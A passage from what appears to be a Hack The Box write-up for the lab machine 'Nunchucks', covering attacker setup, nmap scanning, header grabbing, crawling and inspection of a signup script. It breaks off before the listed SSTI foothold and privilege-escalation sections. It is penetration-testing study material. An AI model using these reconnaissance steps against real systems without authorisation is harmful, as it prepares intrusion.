@@ -1,0 +1,1257 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Linux box.">
+    
+    <title>
+        
+            Nunchucks | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Nunchucks<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-17</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#nginx-port-80-tcp">Nginx (port 80&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#http-headers">HTTP headers</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#technology-lookup">Technology lookup</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#exploration">Exploration</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#site-crawling">Site crawling</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#directory-fuzzing">Directory fuzzing</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#subdomain-fuzzing">Subdomain fuzzing</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#shop-nunchucks-htb-subdomain">shop.nunchucks.htb subdomain</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#under-the-hood">Under the hood</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#xss">XSS</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#ssti">SSTI</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#foothold-ssti">Foothold (SSTI)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#getting-rce">Getting RCE</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#script">Script</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#ssh-port-22-tcp">SSH (port 22&#x2F;tcp)</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#distribution">Distribution</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#kernel">Kernel</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#apparmor">AppArmor</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#hostname">Hostname</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#user-account-information">User account information</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#command-history">Command history</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#sudo-permissions">Sudo permissions</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#environment-variables">Environment variables</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#listening-ports">Listening ports</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#mysql-port-3306-tcp">MySQL (port 3306&#x2F;tcp)</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#processes">Processes</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#suid-binaries">SUID binaries</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#capabilities">Capabilities</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#exploring-opt">Exploring &#x2F;opt</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#privilege-escalation-usr-bin-perl-capabilities">Privilege escalation (&#x2F;usr&#x2F;bin&#x2F;perl capabilities)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#preparation">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#exploitation">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#local-enumeration-1">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2021-11-02</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/114053">TheCyberGeek</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.9</code>, while the target machine's IP address will be <code>10.10.11.122</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Nunchucks using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.11.122<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">22/tcp  open  ssh
+</span><span class="z-text z-plain">80/tcp  open  http
+</span><span class="z-text z-plain">443/tcp open  https
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the services associated with the open ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.11.122<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,80,443<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE  VERSION
+</span><span class="z-text z-plain">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">80/tcp  open  http     nginx 1.18.0 (Ubuntu)
+</span><span class="z-text z-plain">443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
+</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code>  managed to determine that Nunchucks is running Linux, and the SSH version discloses that it might be Ubuntu. That's good to know!</p>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on these services to see if they can find additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.11.122<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,80,443<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">22/tcp  open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
+</span><span class="z-text z-plain">|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
+</span><span class="z-text z-plain">|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
+</span><span class="z-text z-plain">80/tcp  open  http
+</span><span class="z-text z-plain">|_http-title: Did not follow redirect to https://nunchucks.htb/
+</span><span class="z-text z-plain">443/tcp open  https
+</span><span class="z-text z-plain">| tls-alpn: 
+</span><span class="z-text z-plain">|_  http/1.1
+</span><span class="z-text z-plain">|_http-title: 400 The plain HTTP request was sent to HTTPS port
+</span><span class="z-text z-plain">|_ssl-date: TLS randomness does not represent time
+</span><span class="z-text z-plain">| tls-nextprotoneg: 
+</span><span class="z-text z-plain">|_  http/1.1
+</span><span class="z-text z-plain">| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
+</span><span class="z-text z-plain">| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
+</span><span class="z-text z-plain">| Not valid before: 2021-08-30T15:42:24
+</span><span class="z-text z-plain">|_Not valid after:  2031-08-28T15:42:24
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so <code>nmap</code>'s scans found that the Nginx server on port <code>80/tcp</code> is redirecting to <code>https://nunchucks.htb/</code>. The SSL certificate issuer is also set to the domain <code>nunchucks.htb</code>.</p>
+<p>Let's add this domain to our hosts file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.122 nunchucks.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">tee</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /etc/hosts</span>
+</span></code></pre>
+<p>Now we can explore the Nginx server!</p>
+<h2 id="nginx-port-80-tcp">Nginx (port <code>80/tcp</code>)</h2>
+<p>Let's browse to <code>https://nunchucks.htb/</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/domain-homepage.png" alt="Domain homepage" /></p>
+<p>This looks like a website about <code>Nunchucks</code>, an ecommerce shop creation platform.</p>
+<h3 id="http-headers">HTTP headers</h3>
+<p>Before exploring it further, let's check the HTTP response headers when we request the homepage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>k</span> https://nunchucks.htb/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HTTP/1.1 200 OK
+</span><span class="z-text z-plain">Server: nginx/1.18.0 (Ubuntu)
+</span><span class="z-text z-plain">Date: Sun, 17 Dec 2023 10:05:10 GMT
+</span><span class="z-text z-plain">Content-Type: text/html; charset=utf-8
+</span><span class="z-text z-plain">Content-Length: 30589
+</span><span class="z-text z-plain">Connection: keep-alive
+</span><span class="z-text z-plain">X-Powered-By: Express
+</span><span class="z-text z-plain">set-cookie: _csrf=DAgnYEOZNmxU-2v9lc05px9_; Path=/
+</span><span class="z-text z-plain">ETag: W/&quot;777d-t5xzWgv1iuRI5aJo57wYpq8tm5A&quot;
+</span></code></pre>
+<p>The <code>Server</code> header confirms what we already knew thanks to <code>nmap</code>'s default scripts. But the <code>X-Powered-By</code> header discloses that this website uses Express, a web framework for Node.js.</p>
+<h3 id="technology-lookup">Technology lookup</h3>
+<p>While we're at it, let's look up the technologies used by this website with the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<p>So it confirms what we already discovered, but it also reveals that this website is using Bootstrap and libraries like jQuery.</p>
+<h3 id="exploration">Exploration</h3>
+<p>The only web page that looks interesting is the 'Sign Up' one:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/domain-sign-up-page.png" alt="Domain sign up page" /></p>
+<p>It contains a form that we can fill to register. But if we try to register with random values, the message 'We're sorry but registration is currently closed' appears.</p>
+<p>There's also a web page for logging in, which looks really similar to the sign up page. Once again, if we fill it with random values, we get the same error message.</p>
+<h3 id="site-crawling">Site crawling</h3>
+<p>Let's crawl the website to see if I missed something.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> katana<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> https://nunchucks.htb/</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[INF] Started standard crawling for =&gt; https://nunchucks.htb/
+</span><span class="z-text z-plain">https://nunchucks.htb/
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/js/scripts.js
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/js/body
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/js/jquery.easing.min.js
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/js/jquery.magnific-popup.js
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/js/bootstrap.min.js
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/css/swiper.css
+</span><span class="z-text z-plain">mailto:support@nunchucks.htb
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/css/magnific-popup.css
+</span><span class="z-text z-plain">https://nunchucks.htb/privacy
+</span><span class="z-text z-plain">https://nunchucks.htb/signup
+</span><span class="z-text z-plain">https://nunchucks.htb/terms
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/js/swiper.min.js
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/css/styles.css
+</span><span class="z-text z-plain">https://nunchucks.htb/
+</span><span class="z-text z-plain">https://nunchucks.htb/index.html
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/js/jquery.min.js
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/js/signup.js
+</span><span class="z-text z-plain">https://nunchucks.htb/terms.html
+</span><span class="z-text z-plain">https://nunchucks.htb/privacy.html
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/css/fontawesome-all.css
+</span><span class="z-text z-plain">https://nunchucks.htb/login
+</span><span class="z-text z-plain">https://nunchucks.htb/assets/css/bootstrap.css
+</span></code></pre>
+<p>The file <code>signup.js</code> might be related to the sign up form, let's retrieve its content.</p>
+<pre data-lang="js" class="language-js z-code"><code class="language-js" data-lang="js"><span class="z-source z-ts"><span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">getElementById</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>form<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">addEventListener</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>submit<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span><span class="z-meta z-arrow z-ts"> <span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-variable z-parameter z-ts">e</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> </span><span class="z-meta z-arrow z-ts"><span class="z-storage z-type z-function z-arrow z-ts">=&gt;</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">  <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">e</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">preventDefault</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">  <span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">fetch</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>/api/signup<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts">    <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">method</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts">    <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">body</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-meta z-function-call z-ts"><span class="z-support z-constant z-json z-ts">JSON</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-json z-ts">stringify</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts"><span class="z-meta z-object z-member z-ts"><span class="z-meta z-objectliteral z-ts">      <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">email</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">querySelector</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>input[type=email]<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-dom z-ts">value</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts"><span class="z-meta z-object z-member z-ts"><span class="z-meta z-objectliteral z-ts">      <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">name</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">querySelector</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>input[type=text]<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-dom z-ts">value</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
